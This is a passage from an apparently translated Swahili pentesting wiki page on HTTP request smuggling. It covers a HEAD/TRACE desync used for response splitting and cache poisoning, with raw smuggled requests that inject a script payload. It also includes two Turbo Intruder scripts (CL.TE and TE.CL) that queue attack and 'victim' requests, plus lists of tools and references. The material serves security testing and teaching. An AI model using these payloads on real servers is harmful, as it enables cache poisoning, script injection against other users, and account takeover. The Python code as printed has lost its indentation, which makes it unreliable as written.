Mfano wa jinsi ya kutumia tabia hii ungekuwa **kuficha kwanza ombi la HEAD**. Ombi hili litajibiwa kwa **vichwa** vya ombi la GET (**`Content-Type`** miongoni mwao). Na kuficha **moja kwa moja baada ya HEAD ombi la TRACE**, ambalo litakuwa **linarejelea data iliyotumwa**.\
Kwa kuwa jibu la HEAD litakuwa na kichwa cha `Content-Length`, **jibu la ombi la TRACE litachukuliwa kama mwili wa jibu la HEAD, hivyo kuonyesha data isiyo na mipaka** katika jibu.\
Jibu hili litatumwa kwa ombi linalofuata kupitia muunganisho, hivyo hili linaweza **kutumika katika faili ya JS iliyohifadhiwa kwa mfano kuingiza msimbo wa JS usio na mipaka**.

### Kutumia TRACE kupitia HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Endelea kufuata [**hii chapisho**](https://portswigger.net/research/trace-desync-attack) inapendekezwa njia nyingine ya kutumia mbinu ya TRACE. Kama ilivyotajwa, kuficha ombi la HEAD na ombi la TRACE inawezekana **kudhibiti baadhi ya data inayorejelewa** katika jibu la ombi la HEAD. Urefu wa mwili wa ombi la HEAD kimsingi unatajwa katika kichwa cha Content-Length na unaundwa na jibu la ombi la TRACE.

Hivyo, wazo jipya lingeweza kuwa, kujua Content-Length hii na data iliyotolewa katika jibu la TRACE, inawezekana kufanya jibu la TRACE liwe na jibu halali la HTTP baada ya byte ya mwisho ya Content-Length, ikiruhusu mshambuliaji kudhibiti kabisa ombi kwa jibu linalofuata (ambalo linaweza kutumika kufanya uchafuzi wa cache).

Mfano:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Itazalisha majibu haya (angalia jinsi jibu la HEAD lina Content-Length ikifanya jibu la TRACE kuwa sehemu ya mwili wa HEAD na mara tu Content-Length ya HEAD inapoisha, jibu halali la HTTP linapaswa kuingizwa):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Kuandaa HTTP Request Smuggling kwa Kutumia HTTP Response Desynchronisation

Je, umepata udhaifu wa HTTP Request Smuggling na hujui jinsi ya kuutumia. Jaribu njia hizi nyingine za kutumia:

{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Mbinu Nyingine za HTTP Request Smuggling

- Browser HTTP Request Smuggling (Upande wa Mteja)

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling katika HTTP/2 Downgrades

{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Skripti za Turbo intruder

### CL.TE

Kutoka [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Tools

- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Chombo hiki ni Fuzzer ya HTTP inayotumia sarufi ambayo ni muhimu katika kutafuta tofauti za ajabu za kuomba smuggling.

## References

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)


{{#include ../../banners/hacktricks-training.md}}
